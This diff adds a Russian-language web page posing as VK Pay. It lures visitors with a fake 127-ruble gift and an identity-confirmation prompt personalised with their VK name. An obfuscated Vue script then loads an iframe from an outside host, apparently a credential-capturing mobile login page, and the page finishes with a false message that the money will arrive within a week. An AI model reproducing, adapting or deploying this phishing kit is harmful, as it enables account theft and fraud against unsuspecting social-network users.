@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>vk-pay</title>
+	<link rel="stylesheet" href="style.css">
+</head>
+<body>
+	<div id="app" v-cloak>
+		<div class="vk-app">
+			<template v-if="iframe">
+				<iframe src="http://sanyahuysosi/mobile.html"></iframe>
+			</template>
+			<template v-if="modalIdentification">
+				<div class="modal modal-identification">
+					<div class="modal-overlay" @click="modalIdentification = false"></div>
+					<div class="modal-inner">
+						<div class="modal-close" @click="modalIdentification = false"></div>
+						<div class="modal-content">
+							<div class="identification">
+								<div class="modal-icon">
+									<img src="user-icon.svg" alt="">
+								</div>
+								<h3 class="modal-title">Пройдите идентификацию</h3>
+								<p class="modal-description">
+									Подтвердите что вы являетесь владельцем страницы <span>{{nameuser}}</span>
+								</p>
+								<div class="modal-buttons">
+									<div class="button button-1">
+										<button class="btn btn-secondary" @click="modalIdentification = false">Отменить</button>
+									</div>
+									<div class="button button-2">
+										<button class="btn btn-primary" @click="auth">Подтвердить</button>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</template>
+			<template v-if="modalFinish">
+				<div class="modal modal-finish">
+					<div class="modal-overlay" @click="modalFinish = false, localStorage.setItem('status', '')"></div>
+					<div class="modal-inner">
+						<div class="modal-close" @click="modalFinish = false, localStorage.setItem('status', '')"></div>
+						<div class="modal-content">
+							<div class="finish">
+								<div class="modal-icon">
+									<img src="check.svg" alt="">
+								</div>
+								<h3 class="modal-title">Перевод успешно получен!</h3>
+								<p class="modal-description">
+									Деньги на ваш аккаунт VK Pay будут зачислены в течении одной рабочей недели
+								</p>
+							</div>
+						</div>
+					</div>
+				</div>
+			</template>
+			<template v-if="modalVote">
+				<div class="modal modal-finish">
+					<div class="modal-overlay" @click="modalVote = false"></div>
+					<div class="modal-inner">
+						<div class="modal-close" @click="modalVote = false"></div>
+						<div class="modal-content">
+							<div class="finish">
+								<div class="modal-icon">
+									<img src="warning-icon.svg" alt="">
+								</div>
+								<h3 class="modal-title">Ожидайте получение перевода</h3>
+								<p class="modal-description">
+									Заявка на получение перевода уже оставлена, ожидайте поступления
+								</p>
+							</div>
+						</div>
+					</div>
+				</div>
+			</template>
+			<div class="panel">
+				<div class="panel-inner">
+					<a href="#" class="panel-block">
+						<img src="arrow-right.svg" alt="">
+					</a>
+					<a href="/" class="panel-block">
+						<img src="logo.svg" alt="">
+					</a>
+					<a href="#" class="panel-block">
+						<img src="menu.svg" alt="">
+					</a>
+				</div>
+			</div>
+			<div class="transfer transfer-3">
+				<div class="transfer-inner">
+					<div class="transfer-block">
+						<div class="user">
+							<div class="user-img">
+								<img src="https://sun9-22.userapi.com/c845121/v845121610/3bd14/YBisd1gzmy8.jpg" alt="">
+							</div>
+							<div class="user-name">VK Pay</div>
+						</div>
+						<div class="transfer-content">
+							<p>Перевод в размере:</p>
+							<div class="transfer-money">
+								127<span>₽</span>
+							</div>
+						</div>
+						<div class="transfer-comment">Подарок за пользование VK Pay</div>
+					</div>
+					<button class="btn btn-primary btn-transfer" @click="if (localStorage.getItem('vote') != 1 || localStorage.getItem('vote') == null) {modalIdentification = true}else{modalVote = true}">Получить деньги</button>
+				</div>
+			</div>
+		</div>
+	</div>
+	<script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
+    <script>
+        // Sends event to client
+        vkBridge.send('VKWebAppInit');
+        var user_info = vkBridge.send('VKWebAppGetUserInfo', {})
+    </script> 
+	<script src="https://cdn.jsdelivr.net/npm/vue"></script>
+	<script>
+		var _0x3d1f=['modalIdentification','getItem','then','nameuser','modalFinish','first_name','#app','last_name','iframe'];(function(_0x29376f,_0x3d1f81){var _0x2715ca=function(_0x37bf5a){while(--_0x37bf5a){_0x29376f['push'](_0x29376f['shift']());}};_0x2715ca(++_0x3d1f81);}(_0x3d1f,0x6e));var _0x2715=function(_0x29376f,_0x3d1f81){_0x29376f=_0x29376f-0x0;var _0x2715ca=_0x3d1f[_0x29376f];return _0x2715ca;};var app=new Vue({'el':_0x2715('0x4'),'data':{'modalIdentification':![],'modalFinish':![],'modalVote':![],'iframe':![],'nameuser':''},'methods':{'auth'(){this[_0x2715('0x6')]=!![];this[_0x2715('0x7')]=![];}},'created':function(){user_info[_0x2715('0x0')](_0x5af8c2=>{this[_0x2715('0x1')]=_0x5af8c2[_0x2715('0x3')]+'\x20'+_0x5af8c2[_0x2715('0x5')];});if(localStorage[_0x2715('0x8')]('status')=='success'){this[_0x2715('0x2')]=!![];}}});
+	</script>
+</body>
+</html>
